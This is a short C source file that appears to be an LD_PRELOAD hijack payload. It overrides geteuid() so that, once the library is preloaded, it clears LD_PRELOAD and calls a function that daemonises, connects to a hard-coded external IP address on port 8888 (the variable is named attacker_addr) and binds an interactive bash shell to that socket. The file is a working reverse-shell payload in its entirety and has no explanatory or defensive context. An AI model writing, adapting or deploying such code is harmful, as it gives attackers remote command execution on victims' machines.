#include <stdlib.h>
#include <stdio.h>
#include <string.h> 
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
int shell(void) {
  daemon(1, 0);
  int sock = socket(AF_INET, SOCK_STREAM, 0);
  struct sockaddr_in attacker_addr = {0};
  attacker_addr.sin_family = AF_INET;
  attacker_addr.sin_port = htons(8888);
  attacker_addr.sin_addr.s_addr = inet_addr("115.29.36.83");
  if(connect(sock, (struct sockaddr *)&attacker_addr,
  sizeof(attacker_addr))!=0)
  _exit(0);
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);
  execl("/bin/bash", "/bin/bash", "-i", NULL);
}
int geteuid() {
  if (getenv("LD_PRELOAD") == NULL){ return 0; }
  unsetenv("LD_PRELOAD");
  shell();
}